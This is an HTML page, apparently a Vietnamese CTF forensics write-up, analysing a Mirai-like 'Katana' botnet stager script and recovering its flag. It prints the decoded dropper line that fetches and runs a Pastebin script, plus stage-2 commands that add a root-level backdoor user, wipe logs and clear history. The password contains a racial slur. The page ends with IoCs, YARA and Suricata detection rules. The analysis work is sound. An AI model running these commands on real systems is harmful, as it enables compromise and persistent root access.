@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Katana Botnet Forensics | Monkey Sec</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="stylesheet" href="../css/post.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">🐒 Monkey Sec</a>
+            <ul>
+                <li><a href="../index.html">Trang chủ</a></li>
+                <li><a href="../writeups.html" class="active">Write-ups</a></li>
+                <li><a href="../blog.html">Blog</a></li>
+                <li><a href="../about.html">Giới thiệu</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <div class="post-layout">
+        <article class="post-container">
+            <header class="post-header">
+                <div class="post-tags">
+                    <span class="list-tag">Forensics</span>
+                    <span class="list-tag">Malware Analysis</span>
+                    <span class="list-tag">CookieHanHoan</span>
+                </div>
+                <h1>Write-up — Phân tích Forensics: Katana / Mirai-like payload</h1>
+                <div class="post-meta">
+                    <span>✍️ Monkey</span>
+                    <span>⏱️ 15 phút đọc</span>
+                    <span class="difficulty medium">Medium</span>
+                </div>
+            </header>
+
+            <!-- TÓM TẮT KẾT QUẢ -->
+            <div class="callout callout-info">
+                <h3>🎯 Tóm tắt kết quả</h3>
+                <ul>
+                    <li><strong>Flag / IoC:</strong> <code>CHH{Mirai_aka_Katana_b0tn3t}</code></li>
+                    <li><strong>Kết luận:</strong> file <code>payload.py</code> là <em>builder/stager</em>. Địa chỉ C2 không hardcode mà lấy động qua <code>http://api.ipify.org</code>. Payload thật (stage-2) lưu trên Pastebin (<code>Zym8pVcz</code>) — chứa lệnh tạo backdoor và URL có flag.</li>
+                </ul>
+            </div>
+
+            <!-- NỘI DUNG BÀI VIẾT -->
+            <div class="post-content">
+
+                <h2 id="muc-tieu">1. Mục tiêu tài liệu</h2>
+                <ol>
+                    <li>Giải thích chi tiết cấu trúc và hành vi của <code>payload.py</code> (dòng — dòng), kèm tư duy phân tích.</li>
+                    <li>Trình diễn các bước forensic an toàn để tìm <strong>C2 / flag</strong>.</li>
+                    <li>Giải thích khái niệm <strong>botnet</strong>, cơ chế hoạt động, và lý do attacker dùng kỹ thuật trong dropper.</li>
+                    <li>Đề xuất checklist phân tích, các lệnh an toàn, gợi ý phát hiện/giảm thiểu.</li>
+                </ol>
+
+                <h2 id="noi-dung-payload">2. Nội dung tệp <code>payload.py</code></h2>
+                <p>Đoạn mã chính (rút gọn) chứa các phần:</p>
+<pre><code>import subprocess, sys, urllib, time, base64, subprocess
+ip = urllib.urlopen('http://api.ipify.org').read()
+exec_bin = "yakuza"
+exec_name = "wget.ssh"
+bin_prefix = ""
+bin_directory = "vi"
+archs = ["x86.yakuza", "mips.yakuza", ... ]
+# nhiều lệnh run(...) để tạo các shell scripts (yakuza.sh, tyakuza.sh, ...)
+encoded = "Y2QgL3RtcDsg..."
+exploit = str(base64.b64decode(encoded))
+exploitmake(exploit)
+# loop ghi các lệnh wget/curl/ftpget/tftp cho từng arch
+complete_payload = ("cd /tmp || ... wget http://" + ip + "/yakuza.sh; ...")
+f = open("payload.txt","w+")
+f.write(complete_payload)</code></pre>
+
+                <p><strong>Ý chính:</strong> đây là một <em>builder/stager</em> — không phải binary bot chính. Khi attacker chạy script này trên server của họ, nó sẽ tự sinh <code>payload.txt</code> (và nhiều shell script) với <strong>IP public của server attacker</strong> (lấy từ <code>api.ipify.org</code>).</p>
+
+                <h2 id="phan-tich">3. Phân tích chi tiết (dòng — dòng)</h2>
+
+                <h3>A. Imports &amp; biến khởi tạo</h3>
+<pre><code>import subprocess, sys, urllib, time, base64, subprocess</code></pre>
+                <ul>
+                    <li><code>subprocess</code>: gọi lệnh shell qua <code>subprocess.call(..., shell=True)</code>.</li>
+                    <li><code>urllib</code>: thực hiện HTTP GET (<code>urllib.urlopen('http://api.ipify.org')</code>).</li>
+                    <li><code>base64</code>: giải mã chuỗi base64 (thường để che dấu command/URL).</li>
+                    <li><code>time</code>: dùng cho <code>sleep</code>/delay (ở đây <code>time.sleep(3)</code> nhiều chỗ) — có thể để chờ service khởi chạy.</li>
+                </ul>
+                <blockquote>💡 <strong>Tư duy:</strong> khi thấy <code>subprocess</code> + <code>urllib</code> + <code>base64</code> trong script lạ, khả năng cao là <em>loader</em> (download &amp; exec) — cần đặc biệt cảnh giác, không chạy.</blockquote>
+
+                <h3>B. Lấy IP động: <code>api.ipify.org</code></h3>
+<pre><code>ip = urllib.urlopen('http://api.ipify.org').read()</code></pre>
+                <p><code>api.ipify.org</code> trả về <strong>IP public</strong> hiện tại của host gọi đến. Do đó <code>ip</code> ở đây không phải hằng số mà là giá trị <strong>động</strong> tùy nơi attacker chạy script.</p>
+
+                <p><strong>Tại sao attacker làm vậy?</strong></p>
+                <ul>
+                    <li>Kỹ thuật này dùng khi attacker muốn <strong>tạo payload tùy theo IP lúc build</strong> — ví dụ chạy script trên server X; payload được ghi <code>wget http://&lt;IP-of-X&gt;/yakuza.sh</code> → các máy bị nhiễm sẽ tải từ server X.</li>
+                    <li>Lợi ích: không phải sửa tay IP mỗi lần; đổi C2 chỉ cần chạy lại trên server mới.</li>
+                </ul>
+                <blockquote>⚠️ <strong>Hậu quả forensic:</strong> nếu chỉ có <code>payload.py</code> mà không có <code>payload.txt</code> do attacker xuất ra, ta không thể biết IP C2 thật (vì nó không hardcode).</blockquote>
+
+                <h3>C. Danh sách <code>archs</code> và <code>exec_bin</code></h3>
+<pre><code>archs = ["x86.yakuza", "mips.yakuza", ...]
+exec_bin = "yakuza"; exec_name = "wget.ssh"; bin_directory = "vi"</code></pre>
+                <p><strong>Ý đồ attacker:</strong></p>
+                <ul>
+                    <li>Đây là payload multi-arch — chuẩn bị binary cho nhiều kiến trúc (IoT: mips, arm, sh4...) để lây lan rộng.</li>
+                    <li>Script sinh ra lệnh <code>wget http://&lt;ip&gt;/vi/x86.yakuza</code> (và curl/ftp/tftp tương tự) để host nhiễm thử tải nhiều biến thể.</li>
+                </ul>
+
+                <h3>D. Chuỗi <code>encoded</code> (base64)</h3>
+<pre><code>encoded = "Y2QgL3RtcDsgd2dldCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvelltOHBWY3ogLU8gYSA+IC9kZXYvbnVsbCAyPiYxOy..."
+exploit = str(base64.b64decode(encoded))
+exploitmake(exploit)</code></pre>
+                <p>Tác dụng: che dấu command nguy hiểm trong base64 để tránh bị nhìn thấy trực tiếp khi đọc file. Giải mã ta được:</p>
+<pre><code>cd /tmp; wget https://pastebin.com/raw/Zym8pVcz -O a > /dev/null 2>&1; chmod 777 a; sh a > /dev/null 2>&1; rm -rf a; history -c; clear;</code></pre>
+                <p><strong>Giải thích:</strong></p>
+                <ul>
+                    <li>Tải tiếp một script nhỏ ở Pastebin (<code>Zym8pVcz</code>) — đó mới là <em>stage 2</em> chứa lệnh thực thi chính (tạo user backdoor, tải binary thực sự...).</li>
+                    <li>Xóa file sau khi chạy và dọn lịch sử để giảm dấu vết.</li>
+                </ul>
+                <blockquote>💡 <strong>Tư duy forensic:</strong> khi thấy base64 + <code>sh a</code>, phải giải mã base64 (an toàn, offline) chứ không chạy <code>sh</code>.</blockquote>
+
+                <h3>E. Vòng lặp ghi script cho từng arch</h3>
+<pre><code>run('echo "cd /tmp ...; wget http://' + ip + '/'+bin_directory+'/'+i + ' ..." >> /var/www/html/yakuza.sh')
+# tương tự cho ftp/tftp -> /var/ftp/yakuza1.sh, /var/lib/tftpboot/tyakuza.sh</code></pre>
+                <p><strong>Ý đồ:</strong> sinh ra shell script trên server để bot khác (khi chạy) dễ tải binary theo nhiều giao thức (HTTP, FTP, TFTP) — tăng tỷ lệ thành công khi tấn công các thiết bị IoT khác nhau.</p>
+
+                <h3>F. <code>complete_payload</code> và <code>payload.txt</code></h3>
+<pre><code>complete_payload = ("cd /tmp || ... wget http://" + ip + "/yakuza.sh; ... rm -rf *")
+f = open("payload.txt","w+")
+f.write(complete_payload)</code></pre>
+                <ul>
+                    <li><code>complete_payload</code> là command nhồi vào nạn nhân — đủ bước tải, chạy, tải thêm qua tftp/ftp, rồi xóa dấu vết.</li>
+                    <li><code>payload.txt</code> lưu chuỗi đó.</li>
+                </ul>
+                <p><strong>Hậu quả:</strong> nếu attacker chạy script trên server thật, <code>payload.txt</code> sẽ chứa <strong>IP C2 thật</strong> — đây là IoC quan trọng.</p>
+
+                <h3>G. Kết luận phần code</h3>
+                <p><code>payload.py</code> là <strong>builder/stager</strong>: tạo payload có <code>ip</code> của server attacker và script deploy. Script <strong>không chứa</strong> binary bot hay IP C2 cứng — thay vào đó nó <em>tải stage-2 từ Pastebin</em>. Forensic cần: (1) tìm stage-2 (Pastebin), (2) tìm <code>payload.txt</code> sinh ra, hoặc (3) tìm log/pcap chứa request tới <code>api.ipify.org</code> hay <code>pastebin</code>/<code>cookiearena.org</code>.</p>
+
+                <h2 id="quy-trinh">4. Quy trình lấy flag</h2>
+                <ol>
+                    <li><strong>Xem archive:</strong> <code>tar -tvf payload.tar.gz</code> → biết chỉ có <code>payload.py</code>.</li>
+                    <li><strong>Tìm chuỗi quan trọng:</strong> <code>grep -R --line-number -i "yakuza\|payload\|pastebin" .</code> → tìm thấy <code>encoded</code> base64.</li>
+                    <li><strong>Giải mã base64 (chỉ decode, không thực thi):</strong>
+<pre><code>echo "Y2QgL3RtcDsg..." | base64 -d</code></pre>
+                        → nhận được lệnh tải <code>https://pastebin.com/raw/Zym8pVcz</code>.</li>
+                    <li><strong>Thử tải trực tiếp Pastebin (an toàn):</strong>
+<pre><code>curl -s https://pastebin.com/raw/Zym8pVcz</code></pre>
+                        → trả về rỗng (paste bị xóa).</li>
+                    <li><strong>Tìm snapshot trên Wayback:</strong>
+<pre><code>curl -s "http://web.archive.org/cdx/search/cdx?url=pastebin.com/raw/Zym8pVcz&output=text&fl=timestamp,original"</code></pre>
+                        → thấy snapshot <code>20230716061911</code>.</li>
+                    <li><strong>Lấy nội dung snapshot:</strong>
+<pre><code>curl -s "http://web.archive.org/web/20230716061911/https://pastebin.com/raw/Zym8pVcz"</code></pre>
+                        → nhận được:
+<pre><code>useradd -o -u 0 -g 0 -M -d /root -s /bin/bash bigbots;
+echo -e "fatnigger123\nfatnigger123" | passwd bigbots;
+wget -q -O /tmp/... https://cookiearena.org/CHH%7BMirai_aka_Katana_b0tn3t%7D;
+rm -rf /var/log/lastlog; history -c; history -c</code></pre></li>
+                    <li><strong>Phân tích output paste:</strong> URL chứa flag <code>CHH{Mirai_aka_Katana_b0tn3t}</code> — đó là flag/IoC.</li>
+                </ol>
+                <blockquote>⚠️ <strong>Ghi chú an toàn:</strong> trong toàn bộ quá trình, <strong>không chạy</strong> <code>sh</code> hay <code>wget</code> để tải file thực thi. Chỉ lấy nội dung text để đọc.</blockquote>
+
+                <h2 id="phan-tich-lenh">5. Phân tích các lệnh độc hại tìm được</h2>
+
+                <h3>a) Tạo backdoor user</h3>
+<pre><code>useradd -o -u 0 -g 0 -M -d /root -s /bin/bash bigbots;</code></pre>
+                <ul>
+                    <li><code>useradd</code> tạo user mới tên <code>bigbots</code>.</li>
+                    <li><code>-o -u 0</code> gán UID=0 → quyền root.</li>
+                    <li><code>-g 0</code> group root.</li>
+                    <li><code>-M -d /root</code> không tạo home, dùng <code>/root</code>.</li>
+                    <li><code>-s /bin/bash</code> shell login.</li>
+                </ul>
+                <p><strong>Nguy hiểm:</strong> attacker tạo backdoor account với quyền root — cho phép truy cập shell root bất hợp pháp.</p>
+
+                <h3>b) Đặt mật khẩu</h3>
+<pre><code>echo -e "fatnigger123\nfatnigger123" | passwd bigbots;</code></pre>
+                <p>Đặt mật khẩu <code>fatnigger123</code> cho user <code>bigbots</code>. Attacker có credentials root để login (qua SSH/password brute-force nếu mở).</p>
+
+                <h3>c) Tải URL chứa flag</h3>
+<pre><code>wget -q -O /tmp/... https://cookiearena.org/CHH%7BMirai_aka_Katana_b0tn3t%7D;</code></pre>
+                <p>Tải nội dung từ <code>cookiearena.org</code> vào file tạm. URL chứa flag mã URL-encoded <code>CHH{Mirai_aka_Katana_b0tn3t}</code>.</p>
+
+                <h3>d) Xóa dấu vết</h3>
+<pre><code>rm -rf /var/log/lastlog; history -c; history -c</code></pre>
+                <p>Xóa log <code>lastlog</code> (thông tin login), xóa lịch sử shell (<code>history -c</code>) → làm forensic khó hơn.</p>
+
+                <h2 id="botnet">6. Botnet là gì?</h2>
+                <p><strong>Botnet</strong> = <em>network of compromised machines</em> (bot = máy bị nhiễm; net = mạng).</p>
+                <ul>
+                    <li><strong>Bot (agent):</strong> chương trình độc hại chạy trên máy nạn nhân, làm theo lệnh C2.</li>
+                    <li><strong>C2 (Command &amp; Control):</strong> server hoặc cơ chế attacker dùng để gửi lệnh/nhận dữ liệu từ bot.</li>
+                    <li><strong>Controller / Attacker:</strong> người/nhóm điều khiển botnet.</li>
+                </ul>
+
+                <p><strong>Cách hoạt động chung:</strong></p>
+                <ol>
+                    <li><strong>Lây nhiễm:</strong> exploit / brute-force / social-engineering → ghi payload lên máy nạn nhân.</li>
+                    <li><strong>Lập trình agent:</strong> agent khởi chạy, liên hệ C2 để nhận lệnh.</li>
+                    <li><strong>C2 giao tiếp:</strong> qua HTTP(S), IRC, DNS, P2P, hoặc mã hóa/obfuscation.</li>
+                    <li><strong>Thực thi lệnh:</strong> DDoS, mining, mở backdoor, tấn công tiếp (propagation).</li>
+                    <li><strong>Che dấu:</strong> xóa log, setuid, rootkit, persist bằng cron/systemd...</li>
+                </ol>
+
+                <h2 id="ioc">7. IoC (Indicators of Compromise)</h2>
+                <ul>
+                    <li><code>payload.py</code> — stager.</li>
+                    <li>Base64 <code>encoded</code> chỉ tới <code>https://pastebin.com/raw/Zym8pVcz</code> (stage-2).</li>
+                    <li>Pastebin snapshot chứa: <code>useradd ... bigbots</code>, <code>passwd bigbots</code>, <code>wget ... https://cookiearena.org/CHH{Mirai_aka_Katana_b0tn3t}</code>.</li>
+                    <li>Flag/URL: <code>https://cookiearena.org/CHH{Mirai_aka_Katana_b0tn3t}</code></li>
+                    <li>Tên binary/exec: <code>yakuza</code>, <code>x86.yakuza</code>, <code>mips.yakuza</code>...</li>
+                </ul>
+
+                <h2 id="checklist">8. Checklist Forensic an toàn</h2>
+                <blockquote>🔒 <strong>Môi trường:</strong> luôn phân tích trên VM/sandbox offline, snapshot, không nối mạng hoặc ở mạng phân tách.</blockquote>
+                <ul>
+                    <li>Liệt kê archive: <code>tar -tvf payload.tar.gz</code></li>
+                    <li>Tìm chuỗi: <code>grep -R --line-number -i "yakuza\|pastebin\|api.ipify" .</code></li>
+                    <li>Giải mã base64: <code>echo "&lt;base64&gt;" | base64 -d</code></li>
+                    <li>Tải nội dung text an toàn: <code>curl -s &lt;url&gt;</code> (chỉ lấy text)</li>
+                    <li>Xem binary tĩnh: <code>file x86.yakuza; strings x86.yakuza | less</code></li>
+                    <li>PCAP: <code>tshark -r capture.pcap -Y "http.request" -T fields -e ip.dst -e http.host -e http.request.uri</code></li>
+                    <li>Hashing: <code>sha256sum suspicious.bin</code></li>
+                </ul>
+
+                <h2 id="phong-thu">9. Phát hiện &amp; phòng thủ</h2>
+
+                <h3>YARA rule mẫu</h3>
+<pre><code>rule katana_stage1 {
+    strings:
+        $s1 = "api.ipify.org" nocase
+        $s2 = "pastebin.com/raw/" nocase
+        $s3 = "yakuza" nocase
+    condition:
+        any of them
+}</code></pre>
+
+                <h3>Suricata/IDS</h3>
+                <p>Detect HTTP request tới <code>pastebin.com/raw/</code> hoặc path chứa <code>yakuza</code>:</p>
+<pre><code>alert http any any -> any any (msg:"Possible katana stager pastebin download"; content:"pastebin.com/raw/"; sid:1000001; rev:1;)</code></pre>
+
+                <h3>Host-based detection</h3>
+                <ul>
+                    <li>Watch user mới có UID 0 (<code>/etc/passwd</code>).</li>
+                    <li>Giám sát <code>/var/log/auth.log</code>, <code>/var/log/lastlog</code>.</li>
+                    <li>Tìm file <code>yakuza</code> trong webroot <code>/var/www/html</code>, <code>/var/ftp</code>, <code>/var/lib/tftpboot</code>.</li>
+                </ul>
+
+                <h2 id="ket-luan">10. Kết luận</h2>
+                <ul>
+                    <li><code>payload.py</code> không chứa IP C2 cứng; nó lấy IP public động (api.ipify.org) và tải stage-2 từ Pastebin.</li>
+                    <li>Dùng Wayback Machine để khôi phục paste bị xóa, ta tìm được stage-2 và flag: <code>CHH{Mirai_aka_Katana_b0tn3t}</code>.</li>
+                    <li>Luôn phân tích offline, chỉ đọc, không thực thi payload. Dùng rules &amp; giám sát để phát hiện hành vi tương tự.</li>
+                </ul>
+
+                <h2 id="tham-khao">11. Tham khảo</h2>
+                <ul>
+                    <li><em>Practical Malware Analysis</em> (book)</li>
+                    <li>Tools: <code>rizin</code>/<code>radare2</code>, <code>ghidra</code>, <code>tshark</code>, <code>volatility</code>, <code>yara</code>, <code>suricata</code></li>
+                    <li>CTF writeup: CTFtime, Root-Me, TryHackMe (Forensics track)</li>
+                </ul>
+
+            </div>
+
+            <footer class="post-footer">
+                <a href="../writeups/cookiehanhoan.html">← Về CookieHanHoan</a>
+            </footer>
+        </article>
+
+        <!-- MỤC LỤC BÊN PHẢI -->
+        <aside class="toc">
+            <h3>📑 Mục lục</h3>
+            <ul>
+                <li><a href="#muc-tieu">1. Mục tiêu</a></li>
+                <li><a href="#noi-dung-payload">2. Nội dung payload.py</a></li>
+                <li><a href="#phan-tich">3. Phân tích chi tiết</a></li>
+                <li><a href="#quy-trinh">4. Quy trình lấy flag</a></li>
+                <li><a href="#phan-tich-lenh">5. Lệnh độc hại</a></li>
+                <li><a href="#botnet">6. Botnet là gì?</a></li>
+                <li><a href="#ioc">7. IoC</a></li>
+                <li><a href="#checklist">8. Checklist Forensic</a></li>
+                <li><a href="#phong-thu">9. Phát hiện &amp; phòng thủ</a></li>
+                <li><a href="#ket-luan">10. Kết luận</a></li>
+                <li><a href="#tham-khao">11. Tham khảo</a></li>
+            </ul>
+        </aside>
+    </div>
+
+    <footer>
+        <p>© 2026 Monkey Sec · Made with ❤️ on GitHub Pages</p>
+        <div class="social">
+            <a href="https://github.com/monkey1112004">GitHub</a>
+            <a href="#">Email</a>
+        </div>
+    </footer>
+</body>
+</html>
